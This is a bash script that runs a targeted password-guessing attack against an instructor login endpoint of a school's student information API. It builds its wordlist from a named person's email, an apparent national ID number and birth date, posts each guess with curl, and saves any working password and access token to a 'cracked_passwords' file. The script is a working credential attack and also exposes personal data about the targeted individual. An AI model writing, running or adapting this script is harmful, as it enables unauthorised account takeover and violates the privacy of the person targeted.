#!/bin/bash
# Try instructor login with targeted passwords
BASE="https://sis-api.emsi.ma"
TOKEN_FILE="/home/ayoub/projects/cyper/.token.sh"

# Generate more targeted passwords for Safsouf
# Known: y.safsouf@emsi.ma, SSN: EE56091, DOB: 1984-01-01

declare -a PASSWORDS=(
    # Date of birth patterns
    "01011984" "010184" "19840101" "01-01-1984" "01/01/1984"
    "1984-01-01" "01011984" "01Jan1984" "1January1984"
    # SSN patterns
    "EE56091" "ee56091" "56091"
    # Name combos
    "Safsouf" "safsouf" "safsouf1984" "Safsouf1984"
    "yassine" "Yassine" "yassine1984" "Yassine1984"
    "safsoufyassine" "SafsoufYassine" "YassineSafsouf"
    "y.safsouf" "safsouf@2024"
    # Simple
    "azerty" "qwerty" "passer" "passer123"
    "12345678" "azerty123" "qwerty123"
    "123456789" "admin123"
    # EMSI related
    "emsi" "EMSIMARRAKECH" "emsimarrakech"
    "emsi2024" "emsi2025" "emsi2026"
    "Emsi2024" "Emsi2025" "Emsi2026"
    # French/Moroccan
    "Marrakech" "marrakech" "Maroc" "maroc"
    # Combinations
    "safsouf@1984" "yassine@1984" "Safsouf@1984"
    "Yassine@1984" "Yassine@1984" "SAFSOUF"
    # Years only
    "1984" "2024" "2025" "2026"
    "0000" "1234"
    # Instructor patterns
    "Instructor@123" "instructor@123"
    "Instructor123" "instructor123"
    # Common weak
    "Welcome@123" "welcome@123"
    "Password@123" "password@123"
    "P@ssword123" "p@ssword123"
    "Qwerty123!" "Azerty123!"
    # Moroccan phone pattern? (We don't know his number)
    # Academic related
    "IIR" "iir" "3IIR" "prof" "Prof"
    "ee56091Ee" "EE56091ee"
    # random common
    "Passer@123" "passer@123"
    "Test@123" "test@123"
    "Admin@123" "admin@123"
)

echo "[*] Trying login for y.safsouf@emsi.ma"
echo "[*] Testing ${#PASSWORDS[@]} passwords..."

for pwd in "${PASSWORDS[@]}"; do
    result=$(curl -s -w "\n%{http_code}" -X POST "$BASE/v1/auth/login" \
        -H "Content-Type: application/json" \
        -d "{\"email\":\"y.safsouf@emsi.ma\",\"password\":\"$pwd\",\"userType\":\"INSTRUCTOR\"}" 2>&1)
    code=$(echo "$result" | tail -1)
    
    if [ "$code" = "201" ] || [ "$code" = "200" ]; then
        echo "  ✅ SUCCESS! Password: \"$pwd\""
        echo "$result" > /tmp/instructor_login_success.json
        # Save to file
        echo "y.safsouf@emsi.ma:$pwd" >> /home/ayoub/projects/cyper/cracked_passwords.txt
        # Extract token
        cat /tmp/instructor_login_success.json | python3 -c "
import json,sys
d = json.load(sys.stdin)
print('Token:', str(d.get('accessToken', d.get('token', '?')))[:50] + '...')
" 2>/dev/null
        exit 0
    fi
done

echo "  ❌ None of ${#PASSWORDS[@]} passwords worked"
